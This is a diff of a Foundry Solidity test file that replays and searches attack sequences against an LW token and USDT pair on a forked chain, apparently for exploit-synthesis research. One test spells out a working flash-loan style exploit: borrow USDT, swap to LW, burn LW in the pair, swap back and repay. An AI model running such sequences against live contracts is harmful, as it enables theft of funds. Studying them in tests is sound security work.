@@ -203,7 +203,7 @@ contract LWTest is Test, BlockLoader {
         swap_pair_attacker_usdt_lw(amt1, amt2);
         swap_pair_attacker_lw_usdt(amt3, amt4);
         payback_usdt_owner(amt5);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -225,7 +225,7 @@ contract LWTest is Test, BlockLoader {
         swap_pair_attacker_usdt_lw(amt2, amt3);
         swap_pair_attacker_lw_usdt(amt4, amt5);
         payback_usdt_owner(amt6);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -247,7 +247,7 @@ contract LWTest is Test, BlockLoader {
         burn_lw_pair(amt3);
         swap_pair_attacker_lw_usdt(amt4, amt5);
         payback_usdt_owner(amt6);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -267,7 +267,7 @@ contract LWTest is Test, BlockLoader {
         swap_pair_attacker_lw_usdt(amt1, amt2);
         swap_pair_attacker_usdt_lw(amt3, amt4);
         payback_lw_owner(amt5);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -289,7 +289,7 @@ contract LWTest is Test, BlockLoader {
         swap_pair_attacker_lw_usdt(amt2, amt3);
         swap_pair_attacker_usdt_lw(amt4, amt5);
         payback_lw_owner(amt6);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -311,7 +311,7 @@ contract LWTest is Test, BlockLoader {
         burn_lw_pair(amt3);
         swap_pair_attacker_usdt_lw(amt4, amt5);
         payback_lw_owner(amt6);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -337,7 +337,7 @@ contract LWTest is Test, BlockLoader {
         swap_pair_attacker_usdt_lw(amt5, amt6);
         swap_pair_attacker_lw_usdt(amt7, amt8);
         payback_usdt_owner(amt9);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -365,7 +365,7 @@ contract LWTest is Test, BlockLoader {
         swap_pair_attacker_usdt_lw(amt6, amt7);
         swap_pair_attacker_lw_usdt(amt8, amt9);
         payback_usdt_owner(amt10);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -393,7 +393,7 @@ contract LWTest is Test, BlockLoader {
         swap_pair_attacker_usdt_lw(amt6, amt7);
         swap_pair_attacker_lw_usdt(amt8, amt9);
         payback_usdt_owner(amt10);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -421,7 +421,7 @@ contract LWTest is Test, BlockLoader {
         swap_pair_attacker_usdt_lw(amt6, amt7);
         swap_pair_attacker_lw_usdt(amt8, amt9);
         payback_usdt_owner(amt10);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -449,7 +449,7 @@ contract LWTest is Test, BlockLoader {
         burn_lw_pair(amt7);
         swap_pair_attacker_lw_usdt(amt8, amt9);
         payback_usdt_owner(amt10);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -475,7 +475,7 @@ contract LWTest is Test, BlockLoader {
         swap_pair_attacker_lw_usdt(amt5, amt6);
         swap_pair_attacker_usdt_lw(amt7, amt8);
         payback_lw_owner(amt9);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -503,7 +503,7 @@ contract LWTest is Test, BlockLoader {
         swap_pair_attacker_lw_usdt(amt6, amt7);
         swap_pair_attacker_usdt_lw(amt8, amt9);
         payback_lw_owner(amt10);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -531,7 +531,7 @@ contract LWTest is Test, BlockLoader {
         swap_pair_attacker_lw_usdt(amt6, amt7);
         swap_pair_attacker_usdt_lw(amt8, amt9);
         payback_lw_owner(amt10);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -559,7 +559,7 @@ contract LWTest is Test, BlockLoader {
         swap_pair_attacker_lw_usdt(amt6, amt7);
         swap_pair_attacker_usdt_lw(amt8, amt9);
         payback_lw_owner(amt10);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -587,7 +587,7 @@ contract LWTest is Test, BlockLoader {
         burn_lw_pair(amt7);
         swap_pair_attacker_usdt_lw(amt8, amt9);
         payback_lw_owner(amt10);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -595,21 +595,35 @@ contract LWTest is Test, BlockLoader {
         vm.startPrank(attacker);
         vm.warp(blockTimestamp);
         vm.roll(29668034);
+        emit log_named_uint("amt0", 1000000 ether);
         borrow_usdt_owner(1000000 ether);
         printBalance("After step0 ");
+        emit log_named_uint("amt1", usdt.balanceOf(address(attacker)));
+        emit log_named_uint(
+            "amt2",
+            pair.getAmountOut(usdt.balanceOf(address(attacker)), address(usdt))
+        );
         swap_pair_attacker_usdt_lw(
             usdt.balanceOf(address(attacker)),
             pair.getAmountOut(usdt.balanceOf(address(attacker)), address(usdt))
         );
         printBalance("After step1 ");
+        emit log_named_uint("amt3", (2510e18 * 1e18) / lw.getTokenPrice());
         burn_lw_pair((2510e18 * 1e18) / lw.getTokenPrice());
         printBalance("After step2 ");
+        emit log_named_uint("amt4", lw.balanceOf(address(attacker)));
+        emit log_named_uint(
+            "amt5",
+            (pair.getAmountOut(lw.balanceOf(address(attacker)), address(lw)) *
+                9) / 10
+        );
         swap_pair_attacker_lw_usdt(
             lw.balanceOf(address(attacker)),
             (pair.getAmountOut(lw.balanceOf(address(attacker)), address(lw)) *
                 9) / 10
         );
         printBalance("After step3 ");
+        emit log_named_uint("amt6", 1000000 ether);
         payback_usdt_owner(1000000 ether);
         printBalance("After step4 ");
         require(attackGoal(), "Attack failed!");
@@ -634,7 +648,7 @@ contract LWTest is Test, BlockLoader {
         burn_lw_pair(amt3);
         swap_pair_attacker_lw_usdt(amt4, amt5);
         payback_usdt_owner(amt6);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 }
